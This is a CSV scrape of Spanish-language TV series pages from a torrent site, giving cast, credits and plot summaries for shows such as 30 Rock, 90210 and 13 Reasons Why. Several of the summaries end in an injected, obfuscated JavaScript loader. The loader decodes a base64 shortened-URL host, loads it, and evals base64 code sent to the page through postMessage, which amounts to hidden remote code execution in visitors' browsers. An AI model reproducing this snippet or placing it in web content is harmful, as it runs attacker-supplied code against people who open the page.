Series main_page_url,Series name,Ficha tecnica,Resumen
https://www.subtorrents1.com/series/rob/,¡Rob!,"
                       Título Original: Rob
Creador: Lew Morton
Producción Ejecutiva: Eric Tannenbaum, Kim Tannenbaum, Lew Morton y Rob Schneider
Estudio: CBS Television Studios
Género: Comedia
Temporada: 1ª 
Episodios: 8
Fecha de estreno: 12 de enero de 2012
Distribución Paramount
Horario de emisión Jueves 8.30 p.m.

Reparto:
Rob Schneider ... Rob
Claudia Bassols ... Maggie
Diana Maria Riva ... Rosa
Cheech Marin ... Fernando
Lupe Ontiveros ... Abuelita
Eugenio Derbez ... Hector						","
Descripcion
Rob es una comedia basada ligeramente en la vida real del actor Rob Schneider, un chico solitario y eterno soltero que, después de una corta relación sentimental, se casa con su novia latina y entra a formar parte de una extravagente familia mexicano-americana. Tras conocerla en un encuentro casual y comprometerse en tiempo récord, este arquitecto paisajístico decide poner fin a su estatus de soltero y se casa con una atractiva mujer llamada Maggie. A partir de ahí, empezará lo más díficil. Tendrá que ganarse a la sobreprotectora familia de Maggie, un clan latino que no está muy contento con dicha unión. Y es que cuando te casas con una chica, realmente te casas con toda su familia. ¡Prepárate para este gran choque cultural!
Rob (Rob Schneider, Gigoló) es un exitoso arquitecto paisajístico que, después de un frenético romance, se casa con Maggie (Claudia Bassols, Gavilanes), una atractiva y encantadora propietaria de una tienda de moda, que a simple vista parece demasiado para él. Maggie no le ha contado nada de su boda express en Las Vegas a nadie de su extensa familia latina. Pero ahora ella insiste en que Rob conozca formalmente a sus padres y familiares, arruinando sus planes de quedarse en casa y ""tener sexo todo el día"". El problema para ambos es que la familia de Maggie no recibirá a Rob todo lo bien que hubiesen deseado.
"
https://www.subtorrents1.com/series/back-in-the-game/,Back in the Game,"
                       Título original: Back in the Game
Año: 2013
Duración: 22 min.
País: Estados Unidos
Director: Mark Cullen (Creator),  Robb Cullen (Creator),  Glenn Ficarra,  John Requa
Guión: Mark Cullen, Robb Cullen
Música: Michelle Kuznetsky
Productora: 20th Century Fox Television / Kapital Entertainment Género: Comedia | Sitcom. Deporte. Béisbol
Temporada: 1
Capítulos: 13

Reparto:
Maggie Lawson,  
James Caan,  
Lenora Crichlow,  
David Stanford,  
Benjamin Koldyke,  
Griffin Gluck,  
J.J. Totah,  
Shaun Rylee,  
Michelle Betts,  
Kennedy Waite,  
Cooper Roth,  
James Blakely,  
Brandon Salgado,  
Alvin Cowan 

","
Descripcion
Se centra en Terry Gannon, una madre soltera recientemente divorciada que se traslada temporalmente a vivir con su padre separado, un ex jugador de béisbol, bebedor de cerveza. A regañadientes empieza como entrenadora del desamparado equipo de su hijo y vuelve a introducirse en el mundo del deporte que había prometido dejar atrás.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/2091/,2091,"
                       Título original
    2091: Jugar o morir (TV Series) 
Año
    2016
Duración
    60 min.
País
    Colombia Colombia
Director
    Felipe Martínez Amador, Álvaro Curiel 
Guion
    Andrés Gelós, Constanza Cabrera, Lucila Podestá, Luis E. Langlemey, Natacha Caravia, Martín Preusche
Música
    Emilio Kauderer
Fotografía
    Diego Jiménez
Reparto
    Manolo Cardona, Angie Cepeda, Benjamín Vicuña, Luz Cipriota, Ludovico Di Santo, Flora Martínez, José Restrepo, Christopher Von Uckermann, Natalia Reyes, Julio Bracho, Damián Alcázar, Cristina Rodlo, Jason Day, Salvador del Solar, Geraldine Zivic, Tim Janssen, María Barreto, Roberto San Martín, Claudio Cataño, Jean Paul Leroux, Liseth Bitar, Gonzalo Vivanco, Karen Carreno, Alejandra Buitrago, María Cecilia Sánchez 
Productora
    Coproducción Colombia-Argentina; Fox Telecolombia / Fox International Channels
Género
    Serie de TV. Ciencia ficción. Acción. Thriller | Videojuego. Distopía 						","
Descripcion
el comportamiento de la humanidad ha llevado los recursos del planeta a un punto de agotamiento tal que sus habitantes se ven obligados a buscar alternativas para asegurar su supervivencia. Los mejores siete jugadores de Nueva Manaos son reclutados por la Corporación Neodimio para jugar una partida extrema en la luna terraformada de Calisto. A bordo de ""Colonus"", que es a la vez nave y consola de videojuego, compiten entre sí por un lugar de privilegio en el bienestar de Ciudad Destino. Pero todo cambiará cuando Ferrán (Manolo Cardona), descubre la siniestra verdad que se esconde detrás de todo esto.
"
https://www.subtorrents1.com/series/a-kid-called-mayonnaise/,A Kid Called Mayonnaise,"
                       Título original
A Kid Called Mayonnaise
Fecha de lanzamiento
Sep. 01, 2017
Última transmisión
Sep. 01, 2017
Temporadas
1
Estado
Pilot 						","
Descripcion
Cuando un niño de un pueblo pequeño, Mayo Davis, se trasladó a Los Ángeles, él sabía que ayudaba a su madre ejecutar un motel sería emocionante. Lo que no sabía era lo solo que sería. Por eso, cuando una misteriosa chica impulsa mediante un flotador en el desfile y las olas en la Clínica Mayo, se embarca en una épica búsqueda y surrealista para encontrarla, sólo para descubrir que él tiene que hacer una elección entre hacer un amigo y hacer un soporte.
"
https://www.subtorrents1.com/series/a-place-to-call-home/,A Place To Call Home,"
                       Título Original: A Place To Call Home
Creador: Bevan Lee
Productor ejecutivo: John Holmes, Julie McGauran
Productor: Chris Martin-Jones
Location: Sydney, Nueva Gales del Sur, Australia
País: Australia
Idioma: Inglés
Género: Drama de época

Temporada: 1
Capítulos: 13

Temporada: 2
Capítulos: 10

Reparto:

Marta Dusseldorp ... Sarah Adams 
Noni Hazlehurst ... Elizabeth Bligh 
Brett Climo ... George Bligh 
Frankie J. Holden ... Roy Briggs 
David Berry ... James Bligh 
Arianwen Parkes-Lockwood ... Olivia Bligh 
Craig Hall ... el Dr. Jack Duncan 
Abby Earl ... Anna Bligh 
Aldo Mignone ... Gino Poletti 
Adam Gray ... Rene 
Dominic Allburn ... Harry Polson 
Vanessa Buckley ... enfermera Milly 
Rupert Degas ... Padre Patrick						","
Descripcion
La serie está ubicada después de la Segunda Guerra Mundial y se centra en Elizabeth Bligh la matriarca de la familia Bligh, cuyo hijo George controla los intereses de la empresa familiar, después de perder a su esposa Elaine George cree que nunca va a sentirse atraído por otra persona hasta que conoce a Sarah Adams, un mujer con un pasado misterioso que entra en su vida para el enojo de Elizabeth.4 George es padre de Jamie, un joven que tuvo que casarse con Olivia sin amarla por decreto de su abuela y Anna, una joven que tiene que esconder su amor por Gino, un joven que trabaja en las tierras de su familia y a quien conoce desde pequeño. A ellos se les unen Roy Briggs, un hombre que pierde su encanto luego de la muerte de su esposa e hijos y Jack Duncan, un médico y el protegido de Elizabeth.
"
https://www.subtorrents1.com/series/absentia/,Absentia,"
                       Título original
    Absentia (TV Series) 
Año
    2017
Duración
    60 min.
País
    Estados Unidos Estados Unidos
Director
    Gaia Violo (Creator), Matt Cirulnick (Creator) 
Guion
    Matt Cirulnick, Elaina Perpelitt, Kate Powers, Antoinette Stella, Gaia Violo
Reparto
    Stana Katic, Patrick Heusinger, Richard Brake, Bruno Bichir, Cara Theobold, Amber Aga, Angel Bonanni, Paul Freeman, Ralph Ineson, Neil Jackson, Patrick McAuley, Nick Cornwall, J.R. Esposito, Nathan Wiley 
Productora
    Masha Productions
Género
    Serie de TV. Thriller. Drama 						","
Descripcion
Mientras persigue a un asesino en serie, una agente del FBI desaparece y es dada por muerta, dejando solos a su marido, también agente, y a su hijo de 3 años. Pero 6 años después reaparece para sorpresa de todos. Sin recordar nada de lo sucedido desde su secuestro, tiene que adaptarse a una nueva realidad en la que su marido ha rehecho su vida con otra mujer y su hijo no la conoce. Además, una nueva serie de asesinatos hacen pensar a algunos de sus compañeros que ella podría ser la autora.
"
https://www.subtorrents1.com/series/24-legacy/,24: Legacy,"
                       Título original: 24: Legacy
Año: 2017
País: Estados Unidos
Director: Robert Cochran (Creator), Joel Surnow (Creator), Stephen Hopkins
Guion: Robert Cochran, Manny Coto, Howard Gordon, Evan Katz, Joel Surnow
Música: Sean Callery
Fotografía: Jeffrey C. Mygatt, Peter Levy
Productora: 20th Century Fox Television / Fox / Imagine Television
Género: Acción. Drama. Suspenso

Capítulos: 12


Reparto:

Corey Hawkins ... Eric Carter
Miranda Otto ... Rebecca Ingram
Teddy Sears ... Keith Mullins
Ashley Thomas ... Isaac Carter
Dan Bucatinsky ... Andy Shalowitz
Charlie Hofheimer ... Ben Grimes
Sheila Vand ... Nilaa Mizrani
Jimmy Smits ... John Donovan						","
Descripcion
Eric Carter, un veterano de guerra con un duro pasado que regresa a casa, a los brazos de su esposa Nicole, y debe trabajar uniendo fuerzas con con el CTU (Unidad Contra Terrorista), poniéndose bajo las órdenes de Rebecca Ingram, una antigua jefa del CTU, casada con un senador de nombre John Donovan. 
24: Legacy es una nueva entrega dentro de la franquicia creada a partir de la serie de televisión protagonizada por Kiefer Sutherland en el papel del mítico agente federal Jack Bauer. Esta nueva serie está protagonzada por Corey Hawkins (Straight Outta Compton) y la actriz australiana Miranda Otto (Eowyn en la trilogía de El Señor de los Anillos). La producción de Fox mantiene el mismo formato de tiempo real que su predecesora y cuenta con 12 episodios para cubrir los eventos que suceden en un solo día. 
Evan Katz y Manny Coto escriben y producen este spin-off, en el que están acompañados por los productores ejecutivos Howard Gordon y Brian Grazer.
"
https://www.subtorrents1.com/series/666-park-avenue/,666 Park Avenue,"
                       Título Original: 666 Park Avenue
Creadora: David Wilcox
Producción Ejecutiva: Alex Graves, David Wilcox, Gina Girolamo, Leslie Morgenstein y Matt Miller
Estudio: Warner Bros. Television
Género: Drama
Temporada: 1ª
Episodios: 13
Fecha de estreno: 30 de septiembre de 2012
Distribución: Warner
Horario de emisión: Domingos 10.00 p.m.

Reparto:
Rachael Taylor ... Jane Van Veen
Dave Annable ... Henry Martin
Terry O'Quinn ... Gavin Doran
Vanessa Williams ... Olivia Doran
Mercedes Masöhn ... Louise Leonard
Robert Buckley ... Brian Leonard
Helena Mattsson ... Alexis Blume
Erik Palladino ... Tony DeMeo
Samantha Logan ... Nona Clark						","
Descripcion
¿Qué estarías dispuesto a hacer para conseguir todo lo que deseas? Estás invitado a entrar en 666 Park Avenue, una de las direcciones más seductoras de la ciudad de Nueva York. Todo el mundo tiene necesidades acuciantes, deseos y ambiciones. Para los residentes de The Drake, uno de los edificios de apartamentos más lujosos del Upper East Side de Manhattan, todo ello está al alcance de sus manos, por un módico precio, gracias a la cortesía del misterioso dueño de inmueble. Sexy, seductor y acogedor, The Drake mantiene un oscuro control sobre sus inquilinos, alimentando sus ambiciones y deseos. Pero cuidado con lo que deseas, porque el precio que tendrán que pagar por ello es… tu alma.
Bienvenido a The Drake, un aparentemente normal edificio de apartamentos, en donde el mal, la obsesión y los sucesos paranormales están incluidos en el alquiler. En él, todo lo que deseas puede ser tuyo, cortesía de su misterioso propietario, Gavin Doran (Terry O'Quinn, Perdidos). Pero todo contrato de este tipo tiene un precio. Y eso es lo que están a punto de averiguar Jane Van Veen (Rachael Taylor, Los ángeles de Charlie) y Henry Martin (Dave Annable, Cinco hermanos), una joven e idealista pareja que acaba de llegar a la glamurosa Nueva York, en donde se les ofrece la oportunidad de ser los administradores del histórico inmueble. Jane es una chica de pueblo con grandes ambiciones, siempre quiso ser arquitecta. Henry, miembro del equipo del alcalde, es sensato, inteligente y tenaz. Ambos se han visto arrastrados por el intoxicante estilo de vida de la élite de la ciudad.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/acceptable-risk/,Acceptable Risk,"
                       Título original
    Acceptable Risk 
Año
    2017
País
    Irlanda Irlanda
Dirección
    Kenneth Glenaan, Christian Langlois 
Guion
    Ron Hutchinson
Música
    Michel Corriveau
Fotografía
    Tim Fleming
Reparto
    Elaine Cassidy, Morten Suurballe, Angeline Ball, Lisa Hogg, Geordie Johnson, Paul Popowich, Risteard Cooper, Kate Moran, Rory Nolan, Gloria Cramer Curtis, Elijah O'Sullivan, Dearbhla Molloy, Catherine Walker, Karen Ardiff 
Productora
    Acorn Media Enterprises / RTÉ
Género
    Thriller | Miniserie de TV 						","
Descripcion
Sarah era una brillante abogada en una multinacional farmacéutica, puesto que abandonó voluntariamente para dedicarse a criar a sus dos hijos, pero la tragedia le persigue tras perder a su primer marido y padre de sus hijos, en un extraño accidente hace tres años, poco después que ella abandonará la empresa. Tras enderezar su situación personal con Lee, otro ejecutivo de la misma multinacional, sufre otro enorme mazazo, cuando descubren el cadáver de Lee en un barrio de mala muerte de Montreal, brutalmente asesinado en la ciudad donde se encontraba en viaje de negocios.
Sarah va descubriendo poco a poco no solo la verdad sobre su compañero Lee sino sobre la multinacional farmacéutica, lo que le obliga a emprender su cruzada personal para esclarecer todo, caiga quien caiga, con grave riesgo para ella y su familia.
"
https://www.subtorrents1.com/series/100-code/,100 Code,"

Título original
    The Hundred Code (TV Series)aka 
Año
    2015
País
    Suecia Suecia
Director
    Jonathan Sjöberg, Robert Moresco, Lisa James-Larsson, Andreas Öhman 
Guion
    Amanda Moresco, P.J. Hennigan, Robert Moresco, Allan Steele, Bill Tangradi, Michael Yebba
Música
    Adam Nordén
Fotografía
    Ulf Brantas
Reparto
    Michael Nyqvist, Dominic Monaghan, Felice Jankell, Charlotta Jonsson, Kristoffer Berglund, Peter Eggers, Danilo Bejarano, Jenny Hutton, Hedda Stiernstedt, Roisin Murphy, Johanna Hedberg, Christian Svensson, Sara Zommorodi, Jason Furlani 
Productora
    Coproducción Suecia-Alemania; Fabrik Entertainment / Red Arrow International / Sky / SBS Discovery
Género
    Serie de TV. Thriller | Crimen 						","
Descripcion
Tommy Conley (Dominic Monaghan), un detective de Nueva York, es enviado a Suecia para observar y asesorar a la policía local en la investigación. Se une el sueco Mikael Eklund (Michael Nyqvist), un veterano de homicidios que trabaja de acuerdo con las reglas. Extremadamente nacionalista, Mikael no acoge con satisfacción la presencia de Conley, se encarga de criticar la cultura americana cada vez que puede. Aunque los dos no se soportan, ellos necesitan encontrar una manera de trabajar juntos.
"
https://www.subtorrents1.com/series/30-rock/,30 Rock,"
                       Título Original: 30 Rock
Creador: Tina Fey
Producción Ejecutiva: Tina Fey, David Miner, Marci Klein, JoAnn Alfano y Lorne Michaels
Estudio: Universal
Género: Comedia
Temporada: 7ª
Episodios: 13
Lugar de rodaje: Nueva York
Sintonía: 30 Rock Theme Song - Jeff Richmond
Distribución: Universal
Audiencia temp. pasada: 4,55 millones de espectadores
Horario de emisión: Jueves 8.00 p.m.
Premios: 14 Emmy's - 6 Globos de Oro

Reparto:
Tina Fay ... Liz Lemon
Tracy Morgan ... Tracy Jordan
Jane Krakowski ... Jenna DeCarlo
Scott Adsit ... Pete Hornberger
Jack McBrayer ... Kenneth
Alec Baldwin ... Jack Donaghy
Judah Friedlander ... Frank
Rachel Dratch ... Varios personajes						","
Descripcion
Bienvenidos al set de rodaje de ""The Girlie Show"", un programa de televisión de variedades en directo, que sirve como escenario para Rockefeller Plaza, una comedia sobre los entresijos en la producción y creación de un espacio de estas características. La serie está narrada a través del personaje de Liz Lemon (Tina Fey, Saturday Night Live), la guionista principal del programa y que frecuentemente suele ser llevada al límite de su razón y paciencia por las dos estrellas del programa, y el exigente director de la cadena.
Liz, que sigue soltera debido a su compromiso con su trabajo, está viviendo el sueño de todo guionista de comedia, ser la principal responsable creativa de un exigente programa en directo en la ciudad de Nueva York. Aunque su vida tendrá un inesperado sobresalto cuando Jack Donaghy (Alec Baldwin, El Aviador) el descarado nuevo ejecutivo de la cadena decide interferir en el programa y ponerlo patas arriba con sus métodos intrusivos. Además, este ejecutivo decide intimidar a Liz para darle más protagonismo a Tracy Jordan (Tracy Morgan, Saturday Night Live), un egocéntrico e imprevisible actor de cine, que acaba de incorporarse al elenco artístico del programa. Ahora Liz deberá controlar y manejar lo incontrolable, para que el programa, y su sueño, pueda salir adelante.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/90210/,90210,"
                       Título Original: 90210
Creador: Darren Star
Producción Ejecutiva: Gabe Sachs y Jeff Judah
Estudio: Paramount
Género: Drama
Temporada: 4ª temporada
Episodios: 22
Lugar de rodaje: Beverly Hills (California)
Distribución: Paramount
Audiencia temp. pasada: 1,82 millones de espectadores
Horario de emisión: Martes 8.00 p.m.

Reparto:
Shenae Grimes ... Annie Wilson
Tristan Wilds ... Dixon Wilson
Rob Estes ... Harry Wilson [ 1 - 2 ]
Lori Loughlin ... Debbie Wilson [ 1 - 3 ]
AnnaLynne McCord ... Naomi Clark
Dustin Milligan ... Ethan Ward [ 1 ]
Jessica Walter ... Tabitha Wilson [ 1 ]
Ryan Eggold ... Ryan Matthews [ 1 - 3 ]
Jessica Stroup ... Erin Silver
Michael Steger ... Navid Shirazi
Jessica Lowndes ... Adrianna Tate-Duncan
Matt Lanter ... Liam Court [ 2 + ]
Gillian Zinser ... Ivy Sullivan [ 2 +]						","
Descripcion
Emocionante y contemporáneo ""spin-off"" de la popular serie Sensación de Vivir, en la nueva 90210 la vida se ve a través de los ojos de Annie Wilson (Shenae Grimes, Degrassi: La nueva generación) y de su hermano Dixon (Tristan Wilds, The Wire), cuyo primer día en el instituto West Beverly Hills no les deja duda de que ya no están en Kansas. La familia Wilson, incluyendo al padre, Harry (Rob Estes, Melrose Place), que decide aceptar el puesto de director del instituto en el que estudió, y a la madre, Debbie (Lori Loughlin, Summerland), una reputada fotógrafa, acaba de mudarse a Beverly Hills para cuidar de la madre de Harry, Tabitha (Jessica Walter, Arrested Development), una festiva y decadente estrella de la televisión y miembro destacada de la Clínica Betty Ford.
"
https://www.subtorrents1.com/series/9jkl/,9JKL,"
                       Título original
    9JKL (TV Series) 
Año
    2017
Duración
    22 min.
País
    Estados Unidos Estados Unidos
Director
    Pamela Fryman 
Guion
    Mark Feuerstein, Dana Klein, Austin Winsberg
Música
    Gabriel Mann
Reparto
    Mark Feuerstein, Elliott Gould, Linda Lavin, Liza Lapira, David Walton, Matt Murray, Albert Tsai, Hana Hayes, Fernando Martinez 
Productora
    CBS Television Studios / Kapital Entertainment. Distribuida por CBS
Género
    Serie de TV. Comedia | Sitcom. Sitcom familiar 						","
Descripcion
Josh Roberts (Mark Feuerstein), un actor divorciado, vive en el apartamento 9K del edificio en el que creció. Al lado, en el 9J, viven sus padres, y en el 9L vive su hermano con su mujer y su bebé. Josh tratará de poner límites para que su familia no se inmiscuya demasiado en su vida.
"
https://www.subtorrents1.com/series/a-touch-of-cloth-miniserie/,A Touch of Cloth (Miniserie),"
                       Título original: A Touch of Cloth
Año: 2012
Duración: 90 min.
País: Reino Unido
Director: Jim O'Hanlon
Guión: Charlie Brooker, Daniel Maier (Historia: Boris Starling)
Música: Dru Masters, Peter Holmes
Fotografía: Len Gowing

Reparto:
John Hannah,  
Suranne Jones,  
Julian Rhind-Tutt,  
Adrian Bower,  
Navin Chowdhry,  
Raquel Cassidy,  
Daisy Beaumont,  
Theo Barklem-Biggs, 
Kate Fleetwood,  
Geoff McGivern,  
Brian Peck,  
Brian Cox

Productora: Emitido por Sky1; Zeppotron
Género: Comedia. Thriller | Policíaco. Asesinos en serie. Parodia.						","
Descripcion
Una nueva sátira del creador de ""Dead Set"" y ""Black Mirror"" Charlie Brooker, una parodia de los procedimentales policíacos. Jack Cloth es un policía bebedor y solitario que se ha refugiado en su trabajo tras la misteriosa muerte de su mujer. Anne Oldman es su severa y ambiciosa compañera lesbiana. Juntos avanzan entre sórdidos asesinatos, forenses cínicas, traumas personales, tensiones sexuales sin resolver, persecuciones acrobáticas por barrios bajos y jefes amargados que piden resultados antes de 24 horas. Como hacen todos los detectives.
Miniserie:
Temporada: 1
Capítulos: 2
Temporada: 2
Capítulos: 2
Temporada: 3
Capítulos: 2
(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/12-monkeys/,12 Monkeys,"
                       Título original: 12 Monkeys
Año: 2015
País: Estados Unidos
Director: Jeffrey Reiner, David Grossman, Michael Waxman, John Badham, David Boyd
Guión: Travis Fickett, Terry Matalas, Rebecca Kirsch
Música: Paul Linford, Trevor Rabin
Fotografía: Todd McMullen, Tico Poulakakis
Género: Drama, Ciencia ficción

Capítulos: 13


Reparto:

Aaron Stanford ... James Cole
Amanda Schull ... Cassandra Railly
Bill Timoney ... Senator Royce
Kirk Acevedo ... Ramse
Noah Bean ... Aaron Marker
Ramon De Ocampo ... Oliver Peters
Ricky Wayne ... Brian Swinsburg
Robert Wisdom ... Jeremy
Shannon Lucio ... Jennifer
Zeljko Ivanek ... Leland Frost						","
Descripcion
'12 Monkeys' se centra en en Cole, un hombre desesperado que viaja en el tiempo desde el presente apocalíptico que aparece en nuestros días a una misión para localizar y erradicar la fuente de una plaga mortal que eventualmente diezmará a la raza humana.
 
"
https://www.subtorrents1.com/series/a-to-z/,A to Z,"
                       Título original: A to Z 
Año: 2014
País: Estados Unidos
Director: Michael Patrick Jann
Guión: Ben Queen 
Música: Bo Boddie 
Productora: Le Train Train
Género: Comedia 

Temporada: 1 
Capítulos 13

Reparto:

Katey Sagal ... voiced Narrator
Ben Feldman ... Andrew Lofland
Christina Kirk ... Lydia 
Cristin Milioti ... Zelda Vasco
Henry Zebrowski ... Stu
Hong Chau ... Lora
Lenora Crichlow ... Stephie
Nancy Friedrich ... Nancy
Parvesh Cheena ... Dinesh 
","
Descripcion
'A to Z' sigue el día a día de una pareja desde que empiezan a conocerse hasta que, finalmente, la relación se acaba. Esta comedia romántica se centra en una empresa dedicada a las citas por Internet y lo que todo ello conlleva, planteando la siguiente pregunta: ¿existe el destino en las cuestiones amorosas?(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/13-reasons-why/,13 Reasons Why,"
                       Título original: 13 Reasons Why
Año: 2017
País: Estados Unidos
Director: Kyle Patrick Alvarez,  Gregg Araki,  Carl Franklin,  Tom McCarthy,  Jessica Yu
Guion: Brian Yorkey, Elizabeth Benjamin, Diana Son, Thomas Higgins, Nathan Jackson, Nathan Louis Jackson, Nic Sheff, Hayley Tyler (Libro: Jay Asher)
Música: Eskmo
Fotografía: Ivan Strasburg, Andrij Parekh
Productora: Netflix / Kicked to the Curb Productions / Anonymous Content / July Moon Productions
Género: Drama. Intriga | Adolescencia. Colegios & Universidad. Acoso escolar

Capítulos: 13


Reparto:

Dylan Minnette ... Clay Jensen
Katherine Langford ... Hannah Baker
Christian Navarro ... Tony Padilla
Brandon Flynn ... Justin Foley
Alisha Boe ... Jessica Davis
Justin Prentice ... Bryce Walker
Miles Heizer ... Alex Standall
Ross Butler ... Zach Dempsey
Devin Druid ... Tyler Down
Amy Hargreaves ... Lainie Jensen
Derek Luke ... Mr. Porter
Kate Walsh ... Mrs. Baker						","
Descripcion
Clay Jensen es un adolescente como cualquier otro. Un día, llega a su casa una misteriosa caja de zapatos para él que carece de remitente. Intrigado, decide abrirla y se encuentra con una serie de cintas de cassette, al parecer grabadas por Hannah Barker, una compañera de clase que se suicidó dos semanas antes. Descargar 13 reasons why Torrent.
Hannah escogió a 13 compañeros para contarles su historia, aquellos 13 a los que culpa de lo que pasó. Gracias a unas instrucciones que dejó en la caja, las cintas deberían llegar a todos ellos para que escucharan una verdad que ninguno quiere oír: las trece razones por las que decidió quitarse la vida.
Algunas variantes de busqueda: thirteen reasons why torrent – 13 reasons why download utorrent – por 13 razones
"
https://www.subtorrents1.com/series/1600-penn/,1600 Penn,"
                       TÍTULO ORIGINAL: 1600 Penn 
AÑO: 2012
PAÍS: Estados Unidos
DIRECTOR: Jason Winer
GUIÓN: Jason Winer, Josh Gad
MÚSICA: Orr Rebhun, Erica Weis
PRODUCTORA: 20th Century Fox Television
GÉNERO: Comedia | Sitcom familiar. Política 

REPARTO:
Jenna Elfman, Bill Pullman, Amara Miller, Martha MacIsaac, Josh Gad, Miguel Sandoval
","
Descripcion
Presentada como una comedia centrada sobre una familia disfuncional 1600 Penn se centra en Skip, el hijo mayor e incontrolable (Josh Gad) que vuelve a su casa donde se convierte en una persona fiable y responsable además de ser el pegamento que une a la familia. Esta familia no es cualquiera, vive en la Casa Blanca. Bill Pullman interpretará el papel del presidente Dale Gilchrist. Jenna Elfman ('Dharma y Greg', 'Casi sin querer') será la Primera Dama de los Estados Unidos, Emily Nash Gilchrist. Amara Miller (The Descendants) será Marigold, la hija más joven del presidente (Bill Pullman). Aunque en principio Brittany Snow ('Harry´s Law') debía interpretar a Becca, la mayor de las hijas del presidente que es descrita como perfeccionista, finalmente será Martha MacIsaac ('Greek') la encargada de darle vida ya que físicamente se parece más a los miembros del reparto que han de interpretar a su familia. Andre Holland ('Friends With Benefits') será Marshall Malloy, un agregado de prensa para la Casa Blanca.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/8-tage/,8 TAGE,"
                       Título original
8 Tage
Año
2019
Duración
88 min.
País
Alemania Alemania
Dirección
Rafael Parente (Creator),  Peter Kocyla (Creator),  Michael Krummenacher, Stefan Ruzowitzky
Guion
Peter Kocyla, Rafael Parente, Benjamin Seiler
Música
David Reichelt
Fotografía
Benedict Neuenfels, Jakob Wiessner
Reparto
Christiane Paul,  Mark Waschke,  Lena Klenke,  Fabian Hinrichs,  Nora Waldstätten
Productora
NEUESUPER. Distribuida por Sky
Género
Serie de TV. Drama | Miniserie de TV						","
Descripcion
Ocho días restantes. Un meteorito de 60 kilómetros de ancho está en curso de colisión con la Tierra. La zona de colisión está justo en el centro de Europa. Tasa estimada de supervivencia: cero. Los Estados Unidos intentan sacar al meteorito del curso con armas nucleares, pero fracasan. Toda Europa está huyendo. No es la espectacular versión de Hollywood, sino la historia esencial de una familia real que hace todo lo posible para sobrevivir cuando el mundo se sale de control.
"
